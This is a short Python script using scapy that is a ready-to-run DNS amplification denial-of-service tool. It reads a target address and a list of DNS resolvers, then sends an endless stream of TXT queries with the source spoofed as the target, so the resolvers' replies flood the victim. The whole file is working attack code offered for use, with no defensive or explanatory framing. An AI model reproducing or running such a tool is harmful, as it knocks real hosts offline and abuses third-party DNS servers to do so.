from scapy.all import *
import sys
from random import randrange
try:
    TARGET=sys.argv[1]
    AMP_LIST=sys.argv[2]
except:
    print "Usage: ./"+__file__+" [TARGET] [AMP LIST]"
    exit(1)
print "[+] Attacking "+TARGET+"..."
print 
while 1:
    with open(AMP_LIST,"r") as f:
        for SERVER in f:
            SERVER=SERVER.replace("\n","")
            try:
                send(IP(dst=SERVER, src=TARGET)/UDP(dport=53, sport=randrange(1024,65535))/DNS(qd=DNSQR(qname="goo.gl", qtype="TXT")),verbose=0)
                print "[+] Sent spoofed DNS request to: "+SERVER
            except:
                print "[-] Could not send spoofed DNS request to "+SERVER+" (is the server online?)"
